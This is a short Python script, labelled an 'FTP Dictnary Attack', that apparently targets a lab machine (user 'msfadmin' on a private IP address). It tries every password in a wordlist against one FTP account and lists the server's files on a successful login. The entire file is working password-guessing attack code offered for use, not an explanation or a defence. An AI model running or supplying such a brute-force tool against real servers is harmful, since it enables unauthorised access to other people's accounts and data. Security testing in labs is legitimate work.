#!/usr/bin/python3.7
from pyftpclient.ftp_client import FTPClient
import time

fail = '\033[91m[-]\033[0m'
ok  = '\033[92m[+]\033[0m'
msg_ok=" BINGO - Username: "
msg_fail=" FAIL - Username: "
msg_pass=" Password: "
wordlist="wordlist.txt"
msg_start=".....::: FTP Dictnary Attack  - pyFTPclient :::....." 
msg_final=".....::: FTP Dictnary Attack finished - pyFTPclient :::....." 
msg_ftpclient="List of files on / of home directory"
target = "10.171.1.129"
username = "msfadmin"
port = '21'

print(msg_start)

with open(wordlist, "r") as _word:
    for _line in _word:
        _password = _line.strip("\n")

        try:
            connection_config = {
                'hostname': target,
                'username': username,
                'password': _password,
                'port': int(port)
            }

            with FTPClient(**connection_config) as ftpcliconn:
                print(ok + msg_ok + username + msg_pass + _password)
                print(msg_ftpclient)
                print(ftpcliconn.listdir('/'))
                ftpcliconn.disconnect
            
#            time.sleep(3)

        except:
            print( fail + msg_fail + username + msg_pass + _password)
#            time.sleep(5)

print(msg_final)
